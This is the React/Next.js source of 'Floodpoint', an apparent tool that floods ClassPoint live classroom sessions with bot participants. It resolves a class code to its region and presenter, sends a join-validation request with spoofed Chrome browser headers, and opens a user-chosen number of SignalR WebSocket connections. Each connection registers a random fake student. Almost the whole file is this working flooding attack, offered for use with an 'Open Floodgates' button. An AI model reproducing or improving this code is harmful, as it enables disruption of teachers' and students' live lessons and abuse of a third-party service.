"use client";
import Image from "next/image";
import { useState } from "react";
import * as signalR from "@microsoft/signalr";
import { v4 as uuidv4 } from "uuid"; // For generating unique IDs
import { Input } from "@/components/ui/input";

type ConnectionInfo = {
  id: number;
  username: string;
  participantId: string;
  connection: signalR.HubConnection;
  status: string;
};

type ClassCodeResponse = {
  cpcsRegion: string;
  presenterEmail: string;
  // Add other fields if necessary
};

export default function Home() {
  const [connections, setConnections] = useState<ConnectionInfo[]>([]);
  const [numConnections, setNumConnections] = useState<number>(1);
  const [classCode, setClassCode] = useState<string>("");
  const [isConnecting, setIsConnecting] = useState<boolean>(false);

  const generateUniqueUsername = () =>
    `sigma_${uuidv4().slice(0, 8)}`;
  const generateUniqueParticipantId = () => `participant-${uuidv4()}`;

  const handleConnect = async () => {
    if (isConnecting) {
      console.warn("Already connecting. Please wait.");
      return;
    }

    if (numConnections < 1) {
      alert("Please enter a number greater than 0.");
      return;
    }

    setIsConnecting(true);

    try {
      const response = await fetch(`/api/byclasscode?classcode=${encodeURIComponent(classCode)}`);
      if (!response.ok) {
        throw new Error("Failed to fetch class code information.");
      }
      const data: ClassCodeResponse = await response.json();
      console.log(data);
      const { cpcsRegion, presenterEmail } = data;

      const url = `https://${cpcsRegion}.classpoint.app/classsession`; // Ensure HTTPS

      // Perform the validation POST request once
      const validateResponse = await fetch(
        `https://${cpcsRegion}.classpoint.app/liveclasses/validate-join?presenterEmail=${encodeURIComponent(
          presenterEmail
        )}&classCode=${encodeURIComponent(
          classCode
        )}&participantId=${encodeURIComponent(
          "initial-participant-id" // This will be overridden per connection
        )}&participantUsername=${encodeURIComponent(
          "initial-username"
        )}`, // This will be overridden per connection
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "en-US,en;q=0.9",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            pragma: "no-cache",
            "sec-ch-ua":
              '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
          },
          referrer: "https://www.classpoint.app/",
          referrerPolicy: "strict-origin-when-cross-origin",
          body: null,
          method: "POST",
          mode: "cors",
          credentials: "include", // Include cookies
        }
      );

      if (!validateResponse.ok) {
        console.error("Validation failed");
        alert("Validation failed. Please check your credentials.");
        setIsConnecting(false);
        return;
      }

      const newConnections: ConnectionInfo[] = [];

      for (let i = 0; i < numConnections; i++) {
        const uniqueId = i + 1;
        const username = generateUniqueUsername();
        const participantId = generateUniqueParticipantId();

        const newConnection = new signalR.HubConnectionBuilder()
          .withUrl(url, {
            transport: signalR.HttpTransportType.WebSockets,
            withCredentials: true, // Ensure cookies are sent
          })
          .withAutomaticReconnect()
          .configureLogging(signalR.LogLevel.Information)
          .build();

        // Event Handlers
        newConnection.on("SendJoinClass", (data: unknown) => {
          console.log(`WebSocket ${uniqueId} received SendJoinClass:`, data);
        });

        newConnection.on("SlideChanged", (data: unknown) => {
          console.log(`WebSocket ${uniqueId} received SlideChanged:`, data);
        });

        newConnection.on("ReceiveMessage", (data: unknown) => {
          console.log(`WebSocket ${uniqueId} received message:`, data);
        });

        newConnection.onclose(() => {
          console.log(`WebSocket ${uniqueId} closed`);
          setConnections((prev) =>
            prev.map((conn) =>
              conn.id === uniqueId ? { ...conn, status: "Disconnected" } : conn
            )
          );
        });

        try {
          await newConnection.start();
          console.log(`WebSocket ${uniqueId} connected`);

          // Send initial protocol message
          await newConnection.send("Send", { protocol: "json", version: 1 });

          // Send ParticipantStartup message
          await newConnection.send("ParticipantStartup", {
            participantUsername: username,
            participantName: username,
            participantId: participantId,
            participantAvatar: "",
            cpcsRegion: cpcsRegion,
            presenterEmail: presenterEmail,
            classSessionId: "",
          });

          newConnections.push({
            id: uniqueId,
            username,
            participantId,
            connection: newConnection,
            status: "Connected",
          });
        } catch (err: unknown) {
          console.error(`WebSocket ${uniqueId} connection error:`, err);
          newConnections.push({
            id: uniqueId,
            username,
            participantId,
            connection: newConnection,
            status: "Error",
          });
        }
      }

      setConnections((prev) => [...prev, ...newConnections]);
    } catch (error: unknown) {
      console.error("Error during connection process:", error);
      alert("An error occurred while connecting. Please try again.");
    } finally {
      setIsConnecting(false);
    }
  };

  const handleDisconnectAll = async () => {
    for (const connInfo of connections) {
      try {
        await connInfo.connection.stop();
        console.log(`WebSocket ${connInfo.id} disconnected`);
      } catch (err: unknown) {
        console.error(`Error disconnecting WebSocket ${connInfo.id}:`, err);
      }
    }
    setConnections([]);
  };

  return (
    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start w-full max-w-md">
        <Image
          className=""
          src="/logo.svg"
          alt="Floodpoint logo"
          width={270}
          height={57}
          priority
        />
        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
          <li className="mb-2">
            Get started by entering your class code and number of connections.
          </li>
          <li className="mb-2">Click on &quot;Open Floodgates&quot; and bots will flood the class.</li>
          <li>Please use this tool wisely.</li>
        </ol>

        <div className="flex flex-col gap-4 w-full">
          <label htmlFor="classCode" className="text-sm font-medium">
            Class Code:
          </label>
          <Input
            type="text"
            id="classCode"
            min="1"
            value={classCode}
            onChange={(e) => {
              setClassCode(e.target.value);
            }}
          />
        </div>

        <div className="flex flex-col gap-4 w-full">
          <label htmlFor="numConnections" className="text-sm font-medium">
            Number of Connections:
          </label>
          <Input
            type="number"
            id="numConnections"
            min="1"
            value={numConnections.toString()}
            onChange={(e) => {
              const parsedValue = parseInt(e.target.value, 10);
              setNumConnections(isNaN(parsedValue) ? 0 : parsedValue);
            }}
          />
        </div>

        <div className="flex gap-4 items-center flex-col sm:flex-row w-full">
          <button
            className={`rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 cursor-pointer ${
              isConnecting ? "opacity-50 cursor-not-allowed" : ""
            }`}
            onClick={handleConnect}
            disabled={isConnecting}
          >
            {isConnecting ? "Connecting..." : "Open Floodgates"}
          </button>
          {connections.length > 0 && (
            <button
              className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-red-500 text-white gap-2 hover:bg-red-600 text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 cursor-pointer"
              onClick={handleDisconnectAll}
            >
              Disconnect All
            </button>
          )}
        </div>

        {connections.length > 0 && (
          <div className="w-full mt-4">
            <h2 className="text-lg font-semibold mb-2">Active Connections:</h2>
            <ul className="space-y-2">
              {connections.map((conn) => (
                <li
                  key={conn.id}
                  className={`p-2 border rounded flex justify-between items-center ${
                    conn.status === "Connected"
                      ? "border-green-500 bg-green-100"
                      : conn.status === "Error"
                      ? "border-red-500 bg-red-100"
                      : "border-gray-300 bg-gray-100"
                  }`}
                >
                  <div>
                    <p className={`font-bold ${
                      conn.status === "Connected"
                        ? "text-green-800"
                        : conn.status === "Error"
                        ? "text-red-800"
                        : "text-gray-800"
                    }`}>{conn.username}</p>
                    <p className="text-xs text-gray-600">
                      {conn.participantId}
                    </p>
                  </div>
                  <span
                    className={`px-2 py-1 text-xs font-semibold rounded ${
                      conn.status === "Connected"
                        ? "bg-green-200 text-green-800"
                        : conn.status === "Error"
                        ? "bg-red-200 text-red-800"
                        : "bg-gray-200 text-gray-800"
                    }`}
                  >
                    {conn.status}
                  </span>
                </li>
              ))}
            </ul>
          </div>
        )}
      </main>
      <footer className="row-start-3">
        Built by{" "}
        <a
          href="https://github.com/InsanelyAvner"
          target="_blank"
          rel="noreferrer"
          className="font-medium underline underline-offset-4"
        >
          InsanelyAvner
        </a>
        . The source code is available on{" "}
        <a
          href="https://github.com/InsanelyAvner/floodpoint"
          target="_blank"
          rel="noreferrer"
          className="font-medium underline underline-offset-4"
        >
          GitHub
        </a>
        .
      </footer>
    </div>
  );
}
